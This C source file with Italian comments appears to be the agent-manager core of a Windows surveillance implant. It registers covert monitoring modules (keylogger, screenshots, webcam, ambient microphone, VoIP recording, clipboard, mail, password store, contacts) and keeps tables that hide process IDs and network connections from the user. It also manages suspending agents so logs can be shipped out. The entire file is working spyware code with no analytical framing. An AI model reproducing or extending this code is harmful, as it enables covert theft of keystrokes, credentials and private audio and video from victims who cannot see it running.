#include <windows.h>
#include <stdio.h>
#include <config.h>
#include <rcs/list.h>
#include "common.h"
#include "H4-DLL.h"
#include "AM_Core.h"
#include "LOG.h"
#include <cJSON/cJSON.h>
#include "bss.h"

// XXX Definita in HM_IpcModule!!!!
#define MAX_MSG_LEN 512 // Lunghezza di un messaggio
typedef struct {
	BYTE status; 
#define STATUS_FREE 0 // Libero
#define STATUS_BUSY 1 // In scrittura
#define STATUS_WRIT 2 // Scritto
	FILETIME time_stamp;
	DWORD wrapper_tag;
	DWORD message_len;
	DWORD flags;
	DWORD priority;
#define IPC_LOW_PRIORITY 0x0
#define IPC_DEF_PRIORITY 0x10
#define IPC_HI_PRIORITY  0x100
	BYTE message[MAX_MSG_LEN];
} IPC_MESSAGE;


extern IPC_MESSAGE *IPCServerPeek();
extern void IPCServerRemove(IPC_MESSAGE *);
extern void IPCServerWrite(DWORD, BYTE *, DWORD);
extern BOOL IPCServerInit();

extern void PM_FileAgentRegister();
extern void PM_KeyLogRegister();
extern void PM_SnapShotRegister();
extern void PM_WiFiLocationRegister();
extern void PM_PrintAgentRegister();
extern void PM_CrisisAgentRegister();
extern void PM_VoipRecordRegister(); 
extern void PM_UrlLogRegister();
extern void PM_ClipBoardRegister();
extern void PM_WebCamRegister();
extern void PM_AmbMicRegister();
extern void PM_MailCapRegister();
extern void PM_PStoreAgentRegister();
extern void PM_IMRegister();
extern void PM_DeviceInfoRegister();
extern void PM_MoneyRegister();
extern void PM_MouseLogRegister();
extern void PM_ApplicationRegister();
extern void PM_PDAAgentRegister();
extern void PM_ContactsRegister();
extern void PM_SocialAgentRegister();

typedef void (WINAPI *conf_callback_t)(cJSON*, DWORD counter);
extern BOOL HM_ParseConfSection(char *conf, const char *section, conf_callback_t call_back);

void AM_SuspendRestart(DWORD);

typedef DWORD (WINAPI *PMD_Generic_t) (BYTE *, DWORD, DWORD, FILETIME *); // Prototipo per il dispatch
typedef DWORD (WINAPI *PMS_Generic_t) (BOOL, BOOL); // Prototipo per lo Start/Stop
typedef DWORD (WINAPI *PMI_Generic_t) (cJSON*); // Prototipo per l'Init
typedef DWORD (WINAPI *PMU_Generic_t) (void); // Prototipo per l'UnRegister

#define AM_MAXDISPATCH 50
#define AGENT_NAME_LENGTH 32

typedef struct _amdispatch {
	LIST_ENTRY entry;
	CHAR agent_name[AGENT_NAME_LENGTH];
	DWORD agent_tag;
	PMD_Generic_t pDispatch; 
	PMS_Generic_t pStartStop; 
	PMI_Generic_t pInit; 
	PMU_Generic_t pUnRegister;
	BOOL started;
} AMDISPATCH, *LPAMDISPATCH;

static LIST_ENTRY aDispatchArray = { &aDispatchArray, &aDispatchArray };

static LPAMDISPATCH AllocateDispatchElement()
{
	LPAMDISPATCH dst = alloc_entry<AMDISPATCH>();

	InsertTailList(&aDispatchArray, &dst->entry);
	return dst;
}


static BOOL compare_by_tag(LPAMDISPATCH entry, DWORD key)
{
	return (entry->agent_tag == key);
}

static BOOL compare_by_name(LPAMDISPATCH entry, LPCSTR lpName)
{
	return !stricmp(entry->agent_name, lpName);
}
static LPAMDISPATCH GetDispatchByTag(DWORD dwTag)
{
	return find_entry_in_list<AMDISPATCH>(&aDispatchArray, compare_by_tag, dwTag);
}

static LPAMDISPATCH GetDispatchByName(LPCSTR lpName)
{
	return find_entry_in_list<AMDISPATCH>(&aDispatchArray, compare_by_name, lpName);
}

////////////////////////////////////////////////
// Funzioni e strutture per l'hiding dinamico //
// di connessioni,PID e directory             //
////////////////////////////////////////////////
BYTE *hiding_table[HIDE_ELEM] = {NULL, NULL};
DWORD hiding_count[HIDE_ELEM] = {0, 0}; // Numero di elementi nascosti per tipo

CRITICAL_SECTION hide_critic_sec;

// Ritorna la dimensione dell'elemento corrispondente al tipo
DWORD AM_HideElemSize(DWORD type)
{
	if (type == HIDE_PID)
		return sizeof(PID_HIDE);
	else if (type == HIDE_CNN)
		return sizeof(CONNECTION_HIDE);
	else
		return 0;
}

// Ritorna il wrapper tag relativo al tipo da nascondere
DWORD AM_HideWrapperTag(DWORD type)
{
	if (type == HIDE_PID)
		return WR_HIDE_PID;
	else if (type == HIDE_CNN)
		return WR_HIDE_CON;
	else
		return 0;
}

// Ritorna una struttura nulla del tipo relativo
BYTE *AM_HideNullEntry(DWORD type)
{
	static CONNECTION_HIDE connection_hide = NULL_CONNETCION_HIDE_STRUCT;
	static PID_HIDE pid_hide = NULL_PID_HIDE_STRUCT;

	if (type == HIDE_PID)
		return (BYTE *)&pid_hide;
	else if (type == HIDE_CNN)
		return (BYTE *)&connection_hide;
	else
		return NULL;
}

// Aggiunge un elemento da nascondere alla relativa tabella
BOOL AM_AddHide(DWORD type, void *elem_par)
{
	BYTE *elem = (BYTE *)elem_par;
	BYTE *temp_table = NULL;
	DWORD elem_size = 0;

	// Setta la dimensione di un elemento della tabella
	if ( (elem_size = AM_HideElemSize(type)) == 0 )
		return FALSE;

	EnterCriticalSection(&hide_critic_sec);
	// Allarga la tabella degli elementi interessati
	// XXX...altro piccolo ed improbabile int overflow....
	if ( !(temp_table = (BYTE *)realloc(hiding_table[type], (hiding_count[type] + 1)*elem_size)) ) {
		LeaveCriticalSection(&hide_critic_sec);
		return FALSE;
	}

	// Aggiunge l'elemento nuovo
	hiding_table[type] = temp_table;
	memcpy(hiding_table[type] + hiding_count[type] * elem_size, elem, elem_size);
	hiding_count[type]++;

	// Aggiorna la shared memory
	// Tiene conto che ogni wrapper ha a disposizione una dimensione massima
	// per la configurazione. Se la dimensione eccede quella copiabile, non fa
	// niente (gli elementi nuovi non verrebbero comunque copiati).
	// Termina sempre con una entry nulla (la memoria shared viene inizializzata
	// a 0).

	// Controlla che ci sia lo spazio per copiare la tabella e che venga 
	// lasciata la entry nulla alla fine
	if ( (hiding_count[type] + 1) * elem_size > WRAPPER_MAX_SHARED_MEM ) {
		LeaveCriticalSection(&hide_critic_sec);
		return TRUE;
	}

	IPCServerWrite(AM_HideWrapperTag(type), hiding_table[type], hiding_count[type] * elem_size);
	LeaveCriticalSection(&hide_critic_sec);
	return TRUE;
}


// Toglie un elemento da nascondere dalla relativa tabella
void AM_RemoveHide(DWORD type, void *elem_par)
{
	BYTE *elem = (BYTE *)elem_par;
	DWORD elem_size = 0;
	DWORD i, last_bytes;

	// Setta la dimensione di un elemento della tabella
	if ( (elem_size = AM_HideElemSize(type)) == 0 )
		return;

	EnterCriticalSection(&hide_critic_sec);
	// Cerca l'elemento da eliminare
	for (i=0; i<hiding_count[type]; i++) {
		// L'ha trovato
		if (!memcmp(hiding_table[type] + i * elem_size, elem, elem_size)) {
			// Calcola quanti byte ci sono dopo l'elemento in questione
			last_bytes = (hiding_count[type] - i - 1) * elem_size;

			// Sposta gli elementi successivi indietro per cancellare
			// quello da eliminare (se ce ne sono)
			if (last_bytes)
				memmove_s(hiding_table[type] + i * elem_size, last_bytes, hiding_table[type] + (i+1) * elem_size, last_bytes);
			
			// Diminuisce il numero di elementi e rialloca la memoria
			// (se il counter va a zero, equivale a una free).
			hiding_count[type]--;
			hiding_table[type] = (BYTE *)realloc(hiding_table[type], hiding_count[type] * elem_size);
			// Se la realloc fallisse lo considera come se non ci fossero piu' 
			// elementi (possibile memory leak, molto improbabile...controllo paranoico)
			if (!hiding_table[type])
				hiding_count[type] = 0;

			// Controlla che ci sia lo spazio per copiare la tabella 
			// XXX Non aggiorna la lista via IPC finche' non rimane un numero
			// di entry copiabili
			if ( (hiding_count[type] + 1) * elem_size > WRAPPER_MAX_SHARED_MEM ) {
				LeaveCriticalSection(&hide_critic_sec);
				return;
			}

			IPCServerWrite(AM_HideWrapperTag(type), hiding_table[type], hiding_count[type] * elem_size);
			// Elimina la entry in piu' che prima era presente
			IPCServerWrite(AM_HideWrapperTag(type) + (hiding_count[type] * elem_size), AM_HideNullEntry(type), elem_size);
		}
	}
	LeaveCriticalSection(&hide_critic_sec);
}

// Vede se un elemento e' nascosto
BOOL AM_IsHidden(DWORD type, void *elem_par)
{
	BYTE *elem = (BYTE *)elem_par;
	DWORD elem_size = 0;
	DWORD i, last_bytes;

	// Setta la dimensione di un elemento della tabella
	if ( (elem_size = AM_HideElemSize(type)) == 0 )
		return FALSE;

	EnterCriticalSection(&hide_critic_sec);
	// Cerca l'elemento da eliminare
	for (i=0; i<hiding_count[type]; i++) {
		// L'ha trovato
		if (!memcmp(hiding_table[type] + i * elem_size, elem, elem_size)) {
			LeaveCriticalSection(&hide_critic_sec);
			return TRUE;
		}
	}
	LeaveCriticalSection(&hide_critic_sec);
	return FALSE;
}

// Funzione di utilita' per attivare gli agenti iniettati.
// Nella memoria relativa alla configurazione il primo BOOL indica
// se l'agente e' attivo o no.
void AM_IPCAgentStartStop(DWORD dwTag, BOOL bStartFlag)
{
	IPCServerWrite(dwTag, (BYTE *)&bStartFlag, sizeof(BOOL));
}

// Registra il Monitor con le funzioni di Init, StartStop e Dispatch
// Viene richiamata dalle funzioni di registrazione dei monitor.
DWORD AM_MonitorRegister(const CHAR *agent_name, DWORD agent_tag, BYTE * pDispatch, BYTE * pStartStop, BYTE * pInit, BYTE *pUnRegister)
{
	LPAMDISPATCH dispatchArray = AllocateDispatchElement();
	if (dispatchArray == NULL) {
		return 0;
	}
	sprintf_s(dispatchArray->agent_name, AGENT_NAME_LENGTH, "%s", agent_name);
	dispatchArray->agent_tag = agent_tag;
	dispatchArray->pDispatch = (PMD_Generic_t) pDispatch;
	dispatchArray->pStartStop = (PMS_Generic_t) pStartStop;
	dispatchArray->pInit = (PMI_Generic_t) pInit;
	dispatchArray->pUnRegister = (PMU_Generic_t) pUnRegister;
	dispatchArray->started = FALSE;
	return 1;
}

// Esegue il dispatch per il monitor dwTag
DWORD AM_Dispatch(DWORD dwTag, BYTE * pMsg, DWORD dwMsgLen, DWORD dwFlags, FILETIME *tstamp)
{
	LPAMDISPATCH dispatch = GetDispatchByTag(dwTag);
	if (dispatch == NULL)
		return 0;

	if (dispatch->pDispatch != NULL)
		dispatch->pDispatch(pMsg, dwMsgLen, dwFlags, tstamp);
	return 1;
}


// Esegue lo Start/Stop di un monitor a seconda di dwStartFlag
// TRUE = Start
// FALSE = Stop
DWORD AM_MonitorStartStop(DWORD dwTag, BOOL bStartFlag)
{
	LPAMDISPATCH dispatch = GetDispatchByTag(dwTag);
	if (dispatch == NULL)
		return 0;

	dispatch->started = bStartFlag;
	if (dispatch->pStartStop)
		dispatch->pStartStop(bStartFlag, TRUE);

	return 1;
}

// Prende il tag di un agente per nome
DWORD AM_GetAgentTag(const CHAR *agent_name)
{
	LPAMDISPATCH dispatch = GetDispatchByName(agent_name);
	if (dispatch != NULL)
		return dispatch->agent_tag;

	return 0xFFFFFFFF;
}

// Esegue l'init di un monitor
DWORD AM_MonitorInit(DWORD dwTag, cJSON* elem)
{
	LPAMDISPATCH dispatch = GetDispatchByTag(dwTag);
	if (dispatch == NULL)
		return 0;

	dispatch->started = FALSE;
	if (dispatch->pInit != NULL)
		dispatch->pInit(elem);

	return 1;
}

static void stop_everything(LPAMDISPATCH entry)
{
	if (entry->pStartStop != NULL)
		entry->pStartStop(FALSE, TRUE);
}

static void suspend_everything(LPAMDISPATCH entry)
{
	if (entry->pStartStop != NULL)
		entry->pStartStop(FALSE, FALSE);
}

static void restart_everything(LPAMDISPATCH entry)
{
	if (entry->pStartStop != NULL)
		entry->pStartStop(TRUE, FALSE);
}

static void unregister(LPAMDISPATCH entry)
{
	if (entry->pUnRegister)
		entry->pUnRegister();
}

// Stoppa e Deregistra tutti gli agenti prima dell'uninstall
DWORD AM_UnRegisterAll()
{
	apply_in_list<AMDISPATCH>(&aDispatchArray, stop_everything);
	apply_in_list<AMDISPATCH> (&aDispatchArray, unregister);
	remove_all<AMDISPATCH>(&aDispatchArray, free);
	return 1;
}


// Stoppa tutti gli agent (anche se sono gia' stoppati)
// Vengono poi attivati selettivamente dal file di conf
// o come action di un evento o con la ResartAll
DWORD AM_MonitorSuspendAll()
{
	apply_in_list<AMDISPATCH>(&aDispatchArray, suspend_everything);
	return 1;
}

DWORD AM_MonitorStopAll()
{
	apply_in_list<AMDISPATCH>(&aDispatchArray, stop_everything);
	return 1;
}

// Rimette gli agent nello stato in cui erano al momento
// della SuspendAll (usato quando c'e' una sync e uno scambio
// di code dei log).
// Li riavvia in ordine inverso allo stop
// Gli ultimi agenti registrati rimangono stoppati per meno tempo
DWORD AM_MonitorRestartAll()
{
	reverse_apply_in_list<AMDISPATCH>(&aDispatchArray, restart_everything);
	return 1;

}

#define STIME 25
HANDLE hAMThread = NULL;
BOOL bAM_cp = FALSE; // Semaforo per uscita thread AgentManager

DWORD AM_Main()
{	
	IPC_MESSAGE* msMsg = NULL;

	LOOP {		
		CANCELLATION_POINT(bAM_cp);
		msMsg = IPCServerPeek();
		if(msMsg) {
			AM_Dispatch(msMsg->wrapper_tag, msMsg->message, msMsg->message_len, msMsg->flags, &(msMsg->time_stamp));
			IPCServerRemove(msMsg);
		} else 
			Sleep(STIME);
	}
	
	return 1;
}

void InitAgents()
{
#ifdef __ENABLE_PROCMON_MODULE
	PM_FileAgentRegister();
#endif

#ifdef __ENABLE_SCREENSHOT_MODULE
	PM_SnapShotRegister();
#endif
	PM_WiFiLocationRegister();
	//PM_PrintAgentRegister();
#ifdef __ENABLE_CRISIS_MODULE
	PM_CrisisAgentRegister();
#endif
	PM_UrlLogRegister();
	PM_ClipBoardRegister();
	PM_WebCamRegister();
	PM_MailCapRegister();
	PM_PStoreAgentRegister();
#ifdef __ENABLE_IMAGENT_MODULE
	PM_IMRegister();
#endif
	PM_DeviceInfoRegister();
#ifdef __ENABLE_MONEY_MODULE
	PM_MoneyRegister();
#endif
#if defined(__ENABLE_KEYLOG_MODULE) || defined(__ENABLE_MOUSE_MODULE)
	PM_KeyLogRegister();
	PM_MouseLogRegister();
#endif
#ifdef __ENABLE_APPLICATION_MODULE
	PM_ApplicationRegister();
#endif
#ifdef __ENABLE_PDAGENT_MODULE
	PM_PDAAgentRegister();
#endif
	PM_ContactsRegister();
	PM_AmbMicRegister();
	PM_SocialAgentRegister();
	PM_VoipRecordRegister(); // ma teniamolo per ultimo va, cosi' lo stoppa per ultimo
}

// Inizializza e lancia la prima volta l'AgentManager
DWORD AM_Startup()
{
	BOOL ret_val = IPCServerInit();

	if (ret_val) {
		LOG_InitLog();
		InitializeCriticalSection(&hide_critic_sec);
		InitAgents();
		return 1;
	}

	return 0;
}


// Legge la configurazione degli agent da file
void WINAPI ParseModules(cJSON *root, DWORD dummy)
{
	cJSON* module = cJSON_GetObjectItem(root, "module");
	const char* value = cJSON_GetStringValue(module);
	AM_MonitorInit(AM_GetAgentTag(value), module);	
}

void UpdateAgentConf()
{
	char *conf_json = HM_ReadClearConf(shared.H4_CONF_FILE);
	if (conf_json) {
		HM_ParseConfSection(conf_json, "modules", &ParseModules);
		// Inizializza l'agente "fantasma" social
		AM_MonitorInit(AM_GetAgentTag("social"), NULL);
	}
	SAFE_FREE(conf_json);
}

// Sospende/riprende il thread di AgentManager e starta/stoppa tutti gli agent, 
// per chiudere tutti i log prima di poterli spedire. 
// RESTART = inizializza la prima volta o (dopo una suspend) riporta tutto allo stato
//           del file di configurazione (nel caso di una nuova conf scaricata).
// SUSPEND = Stoppa gli agent memorizzando lo stato in cui si trovavano in quel momento
// RESTART = Rimette gli agent nello stato in cui erano al momento della suspend (usato 
//           dopo che viene scambiata la coda dei log).
void AM_SuspendRestart(DWORD action)
{
	DWORD dwThid;

	// Stoppa tutti gli agent
	if (action == AM_SUSPEND) { 
		// Killa il thread e stoppa gli agent
		QUERY_CANCELLATION(hAMThread, bAM_cp);
		AM_MonitorSuspendAll();
	} else if (action == AM_RESET) {
		// Attiva gli agent e inizializza il thread
		// riportandoli nello stato del file di configuazione.
		AM_MonitorStopAll();
		UpdateAgentConf();
		hAMThread = HM_SafeCreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE) AM_Main, (LPVOID) NULL, 0, &dwThid);		
	} else if (action == AM_RESTART) {
		// Attiva gli agent (secondo lo stato salvato)
		// e inizializza il thread.
		AM_MonitorRestartAll();
		hAMThread = HM_SafeCreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE) AM_Main, (LPVOID) NULL, 0, &dwThid);		
	} else if (action == AM_EXIT) {
		// Killa il thread e stoppa gli agent
		QUERY_CANCELLATION(hAMThread, bAM_cp);
		
		// Esegue le funzioni di uscita degli agent
		AM_UnRegisterAll();
	}
}